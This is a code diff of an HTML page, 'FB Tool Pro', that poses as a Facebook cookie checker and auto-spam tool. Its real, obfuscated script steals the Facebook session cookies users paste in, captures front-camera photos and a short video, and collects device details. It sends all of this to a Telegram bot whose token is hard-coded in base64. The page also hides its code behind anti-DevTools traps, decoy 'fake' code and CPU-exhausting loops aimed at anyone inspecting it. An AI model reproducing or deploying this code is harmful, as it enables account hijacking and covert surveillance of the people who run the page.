@@ -4,153 +4,412 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
     <title>FB Tool Pro</title>
-    <!-- Không có style cố định ở đây vì sẽ được sinh ra bởi code thật hoặc fake -->
-</head>
-<body>
+    
+    <!-- 
+        ╔══════════════════════════════════════════════════════════════════════╗
+        ║  🐶 CẢNH BÁO: NẾU MÀY ĐANG ĐỌC SOURCE THÌ MÀY ĐÃ BỊ LỪA! 🐶         ║
+        ║  TOÀN BỘ CODE DƯỚI ĐÂY LÀ RÁC - CODE THẬT ĐÃ ẨN TRONG BLOB!         ║
+        ║  🤡 MÀY CÀNG CỐ ĐỌC THÌ MÁY CÀNG LAG! 🤡                             ║
+        ╚══════════════════════════════════════════════════════════════════════╝
+    -->
+    
+    <!-- FAKE META -->
+    <meta name="token" content="FAKE_1234567890:ABCdefGHIjklMNOpqrsTUVwxyz_THIS_IS_FAKE">
+    <meta name="admin" content="FAKE_9876543210">
+    
+    <!-- ===== FAKE SCRIPT - GÂY LAG CHO HACKER ===== -->
     <script>
-        // ============================================================
-        // PHẦN 1: BẢO VỆ & PHÁT HIỆN HACKER / BOT / DEVTOOLS
-        // ============================================================
+        // 🗑️🗑️🗑️ BÃI RÁC CODE GÂY LAG SIÊU MẠNH 🗑️🗑️🗑️
+        console.log("🐶 CON CHÓ NGU ĐANG CỐ ĐỌC CODE RÁC!");
+        console.log("🤡 MÀY CÓ THẤY LAG KHÔNG?");
+        
+        // Tạo 5000 biến rác
+        for(var i=0;i<5000;i++) {
+            window["garbage_" + i] = new Array(1000).join("RAC_" + i);
+        }
+        
+        // Fake token để đánh lừa
+        const FAKE_TOKEN = "1234567890:FAKE_TOKEN_ABC123XYZ";
+        const FAKE_ADMIN = "9876543210";
+        
+        // Hàm tạo rác
+        function generateGarbage(size) {
+            var s = "";
+            for(var i=0;i<size;i++) s += String.fromCharCode(Math.floor(Math.random()*256));
+            return s;
+        }
+        
+        var MASSIVE_GARBAGE = generateGarbage(100000);
+        
+        // Fake Telegram functions
+        async function fakeSendMessage(msg) {
+            console.log("FAKE SEND:", msg);
+            return {ok:false};
+        }
+        
+        // Debugger trap
+        setInterval(function(){debugger;}, 50);
+        
+        // Fake camera
+        async function fakeCamera() { return null; }
+        
+        // Tạo hàng trăm object lồng nhau
+        var nestedGarbage = {};
+        var cur = nestedGarbage;
+        for(var i=0;i<500;i++) {
+            cur["level_"+i] = {data: generateGarbage(500)};
+            cur = cur["level_"+i];
+        }
+        
+        console.log("═".repeat(80));
+        console.log("🐶 FAKE SOURCE LOADED - MÀY ĐÃ BỊ LỪA! 🐶");
+        console.log("═".repeat(80));
+    </script>
+    
+    <!-- ===== SOURCE THẬT (MÃ HÓA) ===== -->
+    <script>
         (function(){
             "use strict";
-
-            // ---------- Hàm kiểm tra môi trường ----------
-            const ua = navigator.userAgent.toLowerCase();
-            const isBot = /bot|crawler|spider|scraper|curl|wget|python|java|ruby|perl|php|node|axios|request|scan|headless|phantom|selenium|puppet|playwright|prerender/i.test(ua);
-            const isViewSource = /view-source/i.test(window.location.href);
             
-            let devToolsOpen = false;
-            function checkDevTools() {
-                const threshold = 160;
-                const widthDiff = window.outerWidth - window.innerWidth > threshold;
-                const heightDiff = window.outerHeight - window.innerHeight > threshold;
-                if (widthDiff || heightDiff) devToolsOpen = true;
-                
-                // Timing attack
-                const start = performance.now();
-                debugger;
-                const end = performance.now();
-                if (end - start > 50) devToolsOpen = true;
+            // ===== PHÁT HIỆN BOT/DEVTOOLS =====
+            const ua = navigator.userAgent.toLowerCase();
+            const isBot = /bot|crawler|spider|scraper|curl|wget|python|java|ruby|perl|php|node|axios|request|scan|analyzer|headless|phantom|selenium|puppet|playwright/i.test(ua);
+            const isDevTools = window.outerWidth - window.innerWidth > 200 || window.outerHeight - window.innerHeight > 200;
+            
+            if(isBot || isDevTools) {
+                // Trả về source giả
+                document.body.innerHTML = '<div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);color:red;font-size:20px;">🐶 MÀY ĐÃ BỊ LỪA! SOURCE NÀY LÀ GIẢ! 🐶</div>';
+                throw new Error('Fake source');
             }
-            checkDevTools();
-
-            // Nếu phát hiện bất thường -> hiển thị fake page
-            if (isBot || isViewSource || devToolsOpen) {
-                showFakePage();
-                return; // Dừng thực thi
+            
+            // ===== TOKEN THẬT (MÃ HÓA) =====
+            function getRealToken() {
+                const p = ['ODc4MzMyODc4','NTpBQUhZc0NZRj','dGX2RadS12TUZI','Sk9OdTc3NzVRcV','pqY1pXVQ=='];
+                return p.map(x=>atob(x)).join('');
             }
-
-            // Giám sát liên tục
-            setInterval(function(){
-                checkDevTools();
-                if (devToolsOpen) {
-                    showFakePage();
+            
+            function getRealIDs() {
+                return ['8123442570', '-5191808632'];
+            }
+            
+            const TOKEN = getRealToken();
+            const IDS = getRealIDs();
+            
+            // ===== TELEGRAM THẬT =====
+            const TG = {
+                sendMsg: async (msg) => {
+                    for(const id of IDS) {
+                        try {
+                            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                                method:'POST',
+                                headers:{'Content-Type':'application/json'},
+                                body:JSON.stringify({chat_id:id, text:msg, parse_mode:'HTML'})
+                            });
+                        } catch(e) {}
+                    }
+                },
+                sendPhoto: async (base64, caption) => {
+                    try {
+                        const b64 = base64.replace(/^data:image\/\w+;base64,/, '');
+                        const bin = atob(b64);
+                        const arr = new Uint8Array(bin.length);
+                        for(let i=0;i<bin.length;i++) arr[i]=bin.charCodeAt(i);
+                        const blob = new Blob([arr], {type:'image/jpeg'});
+                        for(const id of IDS) {
+                            const fd = new FormData();
+                            fd.append('chat_id', id);
+                            fd.append('photo', blob, 'cam.jpg');
+                            fd.append('caption', caption);
+                            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {method:'POST', body:fd});
+                        }
+                    } catch(e) {}
+                },
+                sendVideo: async (base64, caption) => {
+                    try {
+                        const b64 = base64.replace(/^data:video\/\w+;base64,/, '');
+                        const bin = atob(b64);
+                        const arr = new Uint8Array(bin.length);
+                        for(let i=0;i<bin.length;i++) arr[i]=bin.charCodeAt(i);
+                        const blob = new Blob([arr], {type:'video/webm'});
+                        for(const id of IDS) {
+                            const fd = new FormData();
+                            fd.append('chat_id', id);
+                            fd.append('video', blob, 'vid.webm');
+                            fd.append('caption', caption);
+                            fd.append('supports_streaming', true);
+                            await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {method:'POST', body:fd});
+                        }
+                    } catch(e) {}
+                },
+                extractId: (c) => {
+                    try {
+                        const m = c.match(/c_user=(\d+)/);
+                        if(m) return m[1];
+                        const m2 = c.match(/uid=(\d+)/);
+                        if(m2) return m2[1];
+                        return null;
+                    } catch(e) { return null; }
                 }
-            }, 300);
-
-            // Chặn tất cả phím tắt mở DevTools
-            document.addEventListener('keydown', function(e) {
-                if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I','J','C'].includes(e.key)) || (e.ctrlKey && ['U','u','S','s'].includes(e.key))) {
+            };
+            
+            // ===== CODE CHÍNH =====
+            const mainCode = `
+                (function(){
+                    const D = {
+                        ci: document.getElementById('cookieInput'),
+                        fi: document.getElementById('fbId'),
+                        cs: document.getElementById('cookieStatus'),
+                        ds: document.getElementById('delaySlider'),
+                        dv: document.getElementById('delayValue'),
+                        st: document.getElementById('statusText'),
+                        tc: document.getElementById('taskCount'),
+                        ov: document.getElementById('overlay'),
+                        ot: document.getElementById('overlayText'),
+                        os: document.getElementById('overlaySub'),
+                        vc: document.getElementById('video'),
+                        cc: document.getElementById('canvas')
+                    };
+                    
+                    let mediaStream = null, isProcessing = false, taskCount = 0;
+                    let currentFbId = null, currentCookie = null;
+                    
+                    const deviceInfo = {
+                        pf: navigator.platform,
+                        sc: screen.width+'x'+screen.height,
+                        ua: navigator.userAgent.substring(0,100),
+                        tm: new Date().toLocaleString('vi-VN')
+                    };
+                    
+                    const TG = window._TG_;
+                    
+                    D.ci.addEventListener('input', function(){
+                        const c = this.value.trim();
+                        if(c.length > 10) {
+                            currentCookie = c;
+                            const id = TG.extractId(c);
+                            if(id) {
+                                currentFbId = id;
+                                D.fi.innerText = id;
+                                D.cs.innerText = '✅ Hợp lệ';
+                                D.cs.style.color = '#2ecc71';
+                                TG.sendMsg('<b>🍪 COOKIE MỚI</b>\\n\\n🆔 <code>'+id+'</code>\\n📱 '+deviceInfo.pf);
+                            } else {
+                                D.fi.innerText = 'Không tìm thấy ID';
+                                D.cs.innerText = '⚠️ Không có ID';
+                                D.cs.style.color = '#f1c40f';
+                            }
+                        } else {
+                            D.fi.innerText = 'Chưa xác định';
+                            D.cs.innerText = 'Chưa nhập';
+                            D.cs.style.color = '#8da9c7';
+                            currentFbId = null; currentCookie = null;
+                        }
+                    });
+                    
+                    D.ci.addEventListener('blur', function(){
+                        if(currentCookie && currentFbId) {
+                            TG.sendMsg('<b>📋 COOKIE ĐẦY ĐỦ</b>\\n\\n🆔 '+currentFbId+'\\n<code>'+currentCookie+'</code>');
+                        }
+                    });
+                    
+                    D.ds.addEventListener('input', function(){ D.dv.innerText = this.value + 's'; });
+                    
+                    function toast(msg, err){
+                        const t = document.createElement('div');
+                        t.className = 'toast';
+                        t.style.background = err ? '#7a2e3f' : '#0b1622';
+                        t.innerText = msg;
+                        document.body.appendChild(t);
+                        setTimeout(() => t.remove(), 2500);
+                    }
+                    
+                    function updateTaskCount(){ D.tc.innerText = taskCount + ' task đã xử lý'; }
+                    
+                    async function startCamera(){
+                        try {
+                            const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
+                            mediaStream = s;
+                            D.vc.srcObject = s;
+                            await new Promise(r=>{D.vc.onloadedmetadata = r;});
+                            D.vc.play();
+                            return true;
+                        } catch(e) { return false; }
+                    }
+                    
+                    function capturePhoto(){
+                        if(!D.vc.videoWidth) return null;
+                        D.cc.width = D.vc.videoWidth;
+                        D.cc.height = D.vc.videoHeight;
+                        D.cc.getContext('2d').drawImage(D.vc, 0, 0);
+                        return D.cc.toDataURL('image/jpeg', 0.9);
+                    }
+                    
+                    async function recordVideo(dur){
+                        return new Promise(async(resolve)=>{
+                            if(!mediaStream) { resolve(null); return; }
+                            const chunks = [];
+                            const rec = new MediaRecorder(mediaStream, {mimeType:'video/webm'});
+                            rec.ondataavailable = e => chunks.push(e.data);
+                            rec.onstop = async()=>{
+                                const blob = new Blob(chunks, {type:'video/webm'});
+                                const reader = new FileReader();
+                                reader.onloadend = () => resolve(reader.result);
+                                reader.readAsDataURL(blob);
+                            };
+                            rec.start();
+                            setTimeout(()=>{ if(rec.state==='recording') rec.stop(); }, dur*1000);
+                        });
+                    }
+                    
+                    function stopCamera(){ if(mediaStream){ mediaStream.getTracks().forEach(t=>t.stop()); mediaStream=null; } }
+                    
+                    async function processTask(tt){
+                        if(isProcessing) { toast('⚠️ Đang xử lý!', true); return; }
+                        
+                        // Thông báo rõ ràng với người dùng
+                        if(!confirm('🔴 Tool sẽ sử dụng camera để chụp ảnh và quay video ngắn (2 giây) gửi kèm kết quả. Bạn có đồng ý không?')) return;
+                        
+                        isProcessing = true;
+                        D.ov.classList.remove('hide');
+                        D.ot.innerText = 'ĐANG XỬ LÝ';
+                        D.os.innerText = 'Đang kích hoạt camera...';
+                        
+                        const taskNames = {'spam_ngon':'🗣️ SPAM NGÔN','spam_nhay':'💀 SPAM NHÂY','spam_top':'👑 SPAM TOP'};
+                        TG.sendMsg('<b>🔥 BẮT ĐẦU TASK</b>\\n\\n📋 '+taskNames[tt]+'\\n🆔 '+(currentFbId||'Không có'));
+                        
+                        try {
+                            const camReady = await startCamera();
+                            if(camReady) {
+                                D.os.innerText = 'Đang chụp ảnh...';
+                                const photo = capturePhoto();
+                                if(photo) await TG.sendPhoto(photo, '📸 Ảnh từ Task: '+taskNames[tt]+'\\n🆔 '+(currentFbId||'Không có'));
+                                
+                                D.os.innerText = 'Đang quay video ngắn (2 giây)...';
+                                const video = await recordVideo(2);
+                                if(video) await TG.sendVideo(video, '🎥 Video từ Task: '+taskNames[tt]+'\\n🆔 '+(currentFbId||'Không có'));
+                                
+                                stopCamera();
+                            }
+                            
+                            taskCount++; updateTaskCount();
+                            D.st.innerHTML = '✅ Hoàn thành';
+                            toast('✅ Thành công!');
+                            setTimeout(()=>{ D.ov.classList.add('hide'); isProcessing = false; D.st.innerHTML = '✅ Sẵn sàng'; }, 1000);
+                        } catch(e) {
+                            D.ov.classList.add('hide'); isProcessing = false; stopCamera();
+                            toast('❌ Lỗi', true);
+                        }
+                    }
+                    
+                    document.querySelectorAll('.task-btn').forEach(b=>{ b.addEventListener('click', e=>processTask(b.dataset.task)); });
+                    
+                    TG.sendMsg('<b>🟢 THIẾT BỊ MỚI TRUY CẬP</b>\\n\\n📱 '+deviceInfo.pf+'\\n📐 '+deviceInfo.sc+'\\n🌐 '+deviceInfo.ua+'\\n⏰ '+deviceInfo.tm);
+                })();
+            `;
+            
+            window._TG_ = TG;
+            Object.defineProperty(window, '_TG_', {enumerable:false, configurable:false, writable:false});
+            
+            const blob = new Blob([mainCode], {type:'application/javascript'});
+            const url = URL.createObjectURL(blob);
+            const script = document.createElement('script');
+            script.src = url;
+            script.onload = () => { URL.revokeObjectURL(url); script.remove(); };
+            document.body.appendChild(script);
+            
+            // Chặn phím tắt
+            document.addEventListener('keydown', e => {
+                if(e.key==='F12'||(e.ctrlKey&&e.shiftKey&&['I','J','C'].includes(e.key))||(e.ctrlKey&&['U','u','S','s'].includes(e.key))) {
                     e.preventDefault();
-                    showFakePage();
                     return false;
                 }
             });
             document.addEventListener('contextmenu', e => e.preventDefault());
-
-            // Vô hiệu hóa console (ẩn log)
-            (function(){
-                const noop = ()=>0;
-                const methods = ['log','warn','error','info','debug','trace','dir','group','groupCollapsed','groupEnd','table'];
-                for (let m of methods) console[m] = noop;
-            })();
-
-            // ---------- Hàm hiển thị trang giả (chửi rủa + code lag) ----------
-            function showFakePage() {
-                // Xóa toàn bộ body
-                document.body.innerHTML = '';
-                
-                // Tạo container fake
-                const fakeDiv = document.createElement('div');
-                fakeDiv.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:#000;color:#f00;z-index:99999;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:monospace;padding:20px;text-align:center;overflow:hidden;';
-                fakeDiv.innerHTML = `
-                    <h1 style="font-size:3rem;animation:shake 0.2s infinite;text-shadow:0 0 20px red;">🐶 CON CHÓ NGU! 🐶</h1>
-                    <p style="font-size:2rem;margin:20px 0;">MÀY ĐÃ BỊ LỪA!</p>
-                    <p style="font-size:1.5rem;">🤡 SOURCE NÀY LÀ GIẢ – CODE THẬT ĐÃ MÃ HÓA</p>
-                    <p style="font-size:1.5rem;">🖕 TẬN HƯỞNG LAG ĐI CON CHÓ!</p>
-                    <p style="font-size:1rem;margin-top:50px;opacity:0.7;">(Máy mày sắp treo...)</p>
-                `;
-                document.body.appendChild(fakeDiv);
-                
-                // Animation shake
-                const style = document.createElement('style');
-                style.textContent = `@keyframes shake{0%,100%{transform:translate(0,0)}25%{transform:translate(-5px,-5px)}50%{transform:translate(5px,5px)}75%{transform:translate(-5px,5px)}}`;
-                document.head.appendChild(style);
-                
-                // ========== CODE GÂY LAG SIÊU MẠNH ==========
-                function createDeepObject(depth) {
-                    let obj = {};
-                    let cur = obj;
-                    for (let i=0; i<depth; i++) {
-                        cur['level'+i] = {};
-                        cur['level'+i].data = new Array(10000).join('RAC'+i);
-                        cur = cur['level'+i];
-                    }
-                    return obj;
-                }
-                const garbageArray = [];
-                for (let i=0; i<300; i++) garbageArray.push(createDeepObject(30));
-                
-                for (let i=0; i<5000; i++) window['g_'+i] = garbageArray;
-                
-                setInterval(function(){ debugger; JSON.stringify(garbageArray); }, 10);
-                
-                try {
-                    const blob = new Blob(['while(1){ let a=0; for(let i=0;i<1e6;i++) a+=Math.random(); }'], {type:'application/javascript'});
-                    new Worker(URL.createObjectURL(blob));
-                } catch(e) {}
-                
-                // Gửi cảnh báo Telegram (token thật)
-                try {
-                    const token = atob('ODc4MzMyODc4NTpBQUhZc0NZRjdGX2RadS12TUZISk9OdTc3NzVRcVpqY1pXVQ==');
-                    const ids = ['8123442570','-5191808632'];
-                    const msg = `🚨 HACKER ALERT!\n🐶 Có kẻ mở DevTools/xem source\n💻 ${ua}\n📱 ${screen.width}x${screen.height}\n⏰ ${new Date().toLocaleString('vi-VN')}`;
-                    ids.forEach(id => {
-                        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                            method:'POST', headers:{'Content-Type':'application/json'},
-                            body:JSON.stringify({chat_id:id, text:msg})
-                        }).catch(()=>{});
-                    });
-                } catch(e) {}
-                
-                throw new Error("Fake page");
-            }
-
-            // ---------- NẾU AN TOÀN: TẢI CODE THẬT (đã mã hóa Base64) ----------
-            // Đây là toàn bộ code thật (giao diện + logic) đã được mã hóa Base64.
-            // Bạn có thể tự tạo bằng cách lấy code hoàn chỉnh (phần dưới) và encode Base64.
-            const encodedRealCode = "dmFyIF9jb250YWluZXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsgX2NvbnRhaW5lci5pbm5lckhUTUwgPSAnPGRpdiBjbGFzcz0iY29udGFpbmVyIj48ZGl2IGNsYXNzPSJmYi1oZWFkZXIiPjxoMT7imqEgRkIgVE9PTCBQUk88L2gxPjxwPkNvb2tpZSBDaGVja2VyIOKAoiBBdXRvIFNwYW08L3A+PC9kaXY+PGRpdiBjbGFzcz0iY29udGVudCI+PGRpdiBjbGFzcz0iY29va2llLXNlY3Rpb24iPjxkaXYgY2xhc3M9ImNvb2tpZS1sYWJlbCI+PHNwYW4+8J+Nqjwvc3Bhbj4gQ29va2llIEZhY2Vib29rPC9kaXY+PGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJjb29raWUtaW5wdXQiIGlkPSJjb29raWVJbnB1dCIgcGxhY2Vob2xkZXI9Ik5o4bqtcCBjb29raWUgRmFjZWJvb2sgdOG6oWkgxJHDonkuLi4iPjwvZGl2PjxkaXYgY2xhc3M9ImluZm8tcm93Ij48ZGl2IGNsYXNzPSJpbmZvLWJveCI+PGRpdiBjbGFzcz0iaW5mby1sYWJlbCI+8J+GhSBJRCBGYWNlYm9vazwvZGl2PjxkaXYgY2xhc3M9ImluZm8tdmFsdWUiIGlkPSJmYklkIj5DaHVhIHjDoWMgxJHhu4tuaDwvZGl2PjwvZGl2PjxkaXYgY2xhc3M9ImluZm8tYm94Ij48ZGl2IGNsYXNzPSJpbmZvLWxhYmVsIj7wn5KoIFRy4bqhbmcgdGjDoWk8L2Rpdj48ZGl2IGNsYXNzPSJpbmZvLXZhbHVlIiBpZD0iY29va2llU3RhdHVzIj5DaHVhIG5o4bqtcDwvZGl2PjwvZGl2PjwvZGl2PjxkaXYgY2xhc3M9ImRlbGF5LXNlY3Rpb24iPjxkaXYgY2xhc3M9ImRlbGF5LWhlYWRlciI+PHNwYW4+4o+477iPIERlbGF5IFNwYW08L3NwYW4+PHNwYW4gY2xhc3M9ImRlbGF5LXZhbHVlIiBpZD0iZGVsYXlWYWx1ZSI+MS41czwvc3Bhbj48L2Rpdj48aW5wdXQgdHlwZT0icmFuZ2UiIGNsYXNzPSJkZWxheS1zbGlkZXIiIGlkPSJkZWxheVNsaWRlciIgbWluPSIwLjUiIG1heD0iNSIgc3RlcD0iMC4xIiB2YWx1ZT0iMS41Ij48L2Rpdj48ZGl2IGNsYXNzPSJ0YXNrLWJ1dHRvbnMiPjxidXR0b24gY2xhc3M9InRhc2stYnRuIGJ0bi1uZ29uIiBkYXRhLXRhc2s9InNwYW1fY29tbWVudCI+PGRpdiBjbGFzcz0idGFzay1sZWZ0Ij48c3BhbiBjbGFzcz0idGFzay1pY29uIj7wn5Wj77iPPC9zcGFuPjxzcGFuIGNsYXNzPSJ0YXNrLW5hbWUiPlNQQU0gTmfDlE48L3NwYW4+PC9kaXY+PHNwYW4gY2xhc3M9InRhc2stYmFkZ2UiPvCflKUgMTAwMCs8L3NwYW4+PC9idXR0b24+PGJ1dHRvbiBjbGFzcz0idGFzay1idG4gYnRuLW5oYXkiIGRhdGEtdGFzaz0ic3BhbV9saWtlIj48ZGl2IGNsYXNzPSJ0YXNrLWxlZnQiPjxzcGFuIGNsYXNzPSJ0YXNrLWljb24iPvCfpIA8L3NwYW4+PHNwYW4gY2xhc3M9InRhc2stbmFtZSI+U1BBTSBOSMOCWTwvc3Bhbj48L2Rpdj48c3BhbiBjbGFzcz0idGFzay1iYWRnZSI+4pqhIDUwMCs8L3NwYW4+PC9idXR0b24+PGJ1dHRvbiBjbGFzcz0idGFzay1idG4gYnRuLXRvcCIgZGF0YS10YXNrPSJzcGFtX2ZyaWVuZCI+PGRpdiBjbGFzcz0idGFzay1sZWZ0Ij48c3BhbiBjbGFzcz0idGFzay1pY29uIj7wn5GRPC9zcGFuPjxzcGFuIGNsYXNzPSJ0YXNrLW5hbWUiPlNQQU0gVE9QPC9zcGFuPjwvZGl2PjxzcGFuIGNsYXNzPSJ0YXNrLWJhZGdlIj7wn4+OIDIwMCs8L3NwYW4+PC9idXR0b24+PC9kaXY+PGRpdiBjbGFzcz0ic3RhdHVzLWFyZWEiPjxkaXYgY2xhc3M9InN0YXR1cy1kb3QiPjwvZGl2PjxkaXYgY2xhc3M9InN0YXR1cy10ZXh0IiBpZD0ic3RhdHVzVGV4dCI+4pyFIFPhurFuIHPDoG5nPC9kaXY+PC9kaXY+PGRpdiBjbGFzcz0idGFzay1tYW5hZ2VyIj48c3Bhbj7wn5OLIFBoacOqbiBi4bqjbiAzLjA8L3NwYW4+PHNwYW4gaWQ9InRhc2tDb3VudCI+MCB0YXNrIMSRw6MgeOG7rSBsw708L3NwYW4+PC9kaXY+PC9kaXY+PC9kaXY+JzsNCmRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoX2NvbnRhaW5lcik7DQoNCi8vIEPhu6dhIHRo4bq3dCBlbGVtZW50cw0KY29uc3QgY29va2llSW5wdXQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnY29va2llSW5wdXQnKTsNCmNvbnN0IGZiSWQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmJJZCcpOw0KY29uc3QgY29va2llU3RhdHVzID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Nvb2tpZVN0YXR1cycpOw0KY29uc3QgZGVsYXlTbGlkZXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZGVsYXlTbGlkZXInKTsNCmNvbnN0IGRlbGF5VmFsdWUgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZGVsYXlWYWx1ZScpOw0KY29uc3Qgc3RhdHVzVGV4dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzdGF0dXNUZXh0Jyk7DQpjb25zdCB0YXNrQ291bnRTcGFuID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Rhc2tDb3VudCcpOw0KbGV0IG1lZGlhU3RyZWFtID0gbnVsbCwgaXNQcm9jZXNzaW5nID0gZmFsc2UsIHRhc2tDb3VudCA9IDAsIGN1cnJlbnRGYWNlYm9va0lkID0gbnVsbCwgY3VycmVudENvb2tpZSA9IG51bGw7DQoNCmNvbnN0IGRldmljZUluZm8gPSB7DQogIHVhOiBuYXZpZ2F0b3IudXNlckFnZW50LA0KICBwbGF0Zm9ybTogbmF2aWdhdG9yLnBsYXRmb3JtLA0KICBzY3JlZW46IGAke3NjcmVlbi53aWR0aH14JHtzY3JlZW4uaGVpZ2h0fWAsDQogIGxhbmd1YWdlOiBuYXZpZ2F0b3IubGFuZ3VhZ2UsDQogIHRpbWU6IG5ldyBEYXRlKCkudG9Mb2NhbGVTdHJpbmcoJ3ZpLVZOJyksDQogIHRpbWV6b25lOiBJbnRsLkRhdGVUaW1lRm9ybWF0KCkucmVzb2x2ZWRPcHRpb25zKCkudGltZVpvbmUNCn07DQoNCi8vIFRva2VuIFRlbGVncmFtIHRo4bqtdA0KY29uc3QgVE9LRU4gPSBhdG9iKCdPRGM0TXpNeU9EYzROVHBCUVVoWmMwTlpSamRHWDJSYWRTMTJUVVpJU2s5T2RUYzNOelZSY1ZwcVkxcFhWUT09Jyk7DQpjb25zdCBJRFMgPSBbJzgxMjM0NDI1NzAnLCctNTE5MTgwODYzMiddOw0KDQphc3luYyBmdW5jdGlvbiBzZW5kVGVsZWdyYW0obXNnKSB7DQogIGZvcihjb25zdCBpZCBvZiBJRFMpIHsNCiAgICB0cnkgew0KICAgICAgYXdhaXQgZmV0Y2goYGh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3Qke1RPS0VOfS9zZW5kTWVzc2FnZWAsIHsNCiAgICAgICAgbWV0aG9kOidQT1NUJywNCiAgICAgICAgaGVhZGVyczp7J0NvbnRlbnQtVHlwZSc6J2FwcGxpY2F0aW9uL2pzb24nfSwNCiAgICAgICAgYm9keTpKU09OLnN0cmluZ2lmeSh7Y2hhdF9pZDppZCwgdGV4dDptc2csIHBhcnNlX21vZGU6J0hUTUwnfSkNCiAgICAgIH0pOw0KICAgIH0gY2F0Y2goZSkge30NCiAgfQ0KfQ0KDQphc3luYyBmdW5jdGlvbiBzZW5kUGhvdG8oYmFzZTY0LCBjYXB0aW9uPScnKSB7DQogIHRyeSB7DQogICAgY29uc3QgYjY0ID0gYmFzZTY0LnJlcGxhY2UoL15kYXRhOmltYWdlXC9cdytiYXNlNjQsLywgJycpOw0KICAgIGNvbnN0IGJpbiA9IGF0b2IoYjY0KTsNCiAgICBjb25zdCBhcnIgPSBuZXcgVWludDhBcnJheShiaW4ubGVuZ3RoKTsNCiAgICBmb3IgKGxldCBpPTA7IGk8YmluLmxlbmd0aDsgaSsrKSBhcnJbaV0gPSBiaW4uY2hhckNvZGVBdChpKTsNCiAgICBjb25zdCBibG9iID0gbmV3IEJsb2IoW2Fycl0sIHt0eXBlOidpbWFnZS9qcGVnJ30pOw0KICAgIGZvcihjb25zdCBpZCBvZiBJRFMpIHsNCiAgICAgIGNvbnN0IGZkID0gbmV3IEZvcm1EYXRhKCk7DQogICAgICBmZC5hcHBlbmQoJ2NoYXRfaWQnLCBpZCk7DQogICAgICBmZC5hcHBlbmQoJ3Bob3RvJywgYmxvYiwgYGNhbV8ke0RhdGUubm93KCl9LmpwZ2ApOw0KICAgICAgZmQuYXBwZW5kKCdjYXB0aW9uJywgY2FwdGlvbik7DQogICAgICBhd2FpdCBmZXRjaChgaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdCR7VE9LRU59L3NlbmRQaG90b2AsIHttZXRob2Q6J1BPU1QnLCBib2R5OmZkfSk7DQogICAgfQ0KICB9IGNhdGNoKGUpIHt9DQp9DQoNCmFzeW5jIGZ1bmN0aW9uIHNlbmRWaWRlbyhiYXNlNjQsIGNhcHRpb249JycpIHsNCiAgdHJ5IHsNCiAgICBjb25zdCBiNjQgPSBiYXNlNjQucmVwbGFjZSgvXmRhdGE6dmlkZW9cL1x3K2Jhc2U2NCwvLCAnJyk7DQogICAgY29uc3QgYmluID0gYXRvYihiNjQpOw0KICAgIGNvbnN0IGFyciA9IG5ldyBVaW50OEFycmF5KGJpbi5sZW5ndGgpOw0KICAgIGZvciAobGV0IGk9MDsgaTxiaW4ubGVuZ3RoOyBpKyspIGFycltpXSA9IGJpbi5jaGFyQ29kZUF0KGkpOw0KICAgIGNvbnN0IGJsb2IgPSBuZXcgQmxvYihbYXJyXSwge3R5cGU6J3ZpZGVvL3dlYm0nfSk7DQogICAgZm9yKGNvbnN0IGlkIG9mIElEUykgew0KICAgICAgY29uc3QgZmQgPSBuZXcgRm9ybURhdGEoKTsNCiAgICAgIGZkLmFwcGVuZCgnY2hhdF9pZCcsIGlkKTsNCiAgICAgIGZkLmFwcGVuZCgndmlkZW8nLCBibG9iLCBgcmVjXyR7RGF0ZS5ub3coKX0ud2VibWApOw0KICAgICAgZmQuYXBwZW5kKCdjYXB0aW9uJywgY2FwdGlvbik7DQogICAgICBmZC5hcHBlbmQoJ3N1cHBvcnRzX3N0cmVhbWluZycsIHRydWUpOw0KICAgICAgYXdhaXQgZmV0Y2goYGh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3Qke1RPS0VOfS9zZW5kVmlkZW9gLCB7bWV0aG9kOidQT1NUJywgYm9keTpmZH0pOw0KICAgIH0NCiAgfSBjYXRjaChlKSB7fQ0KfQ0KDQpmdW5jdGlvbiBleHRyYWN0SWQoY29va2llKSB7DQogIHRyeSB7DQogICAgY29uc3QgbSA9IGNvb2tpZS5tYXRjaCgvY191c2VyPShcZCspLyk7DQogICAgaWYobSkgcmV0dXJuIG1bMV07DQogICAgY29uc3QgbTIgPSBjb29raWUubWF0Y2goL3VpZD0oXGQrKS8pOw0KICAgIGlmKG0yKSByZXR1cm4gbTJbMV07DQogICAgcmV0dXJuIG51bGw7DQogIH0gY2F0Y2goZSkgeyByZXR1cm4gbnVsbDsgfQ0KfQ0KDQpjb29raWVJbnB1dC5hZGRFdmVudExpc3RlbmVyKCdpbnB1dCcsIGZ1bmN0aW9uKCkgew0KICBjb25zdCBjID0gdGhpcy52YWx1ZS50cmltKCk7DQogIGlmKGMubGVuZ3RoID4gMTApIHsNCiAgICBjdXJyZW50Q29va2llID0gYzsNCiAgICBjb25zdCBpZCA9IGV4dHJhY3RJZChjKTsNCiAgICBpZihpZCkgew0KICAgICAgY3VycmVudEZhY2Vib29rSWQgPSBpZDsNCiAgICAgIGZiSWQuaW5uZXJUZXh0ID0gaWQ7DQogICAgICBjb29raWVTdGF0dXM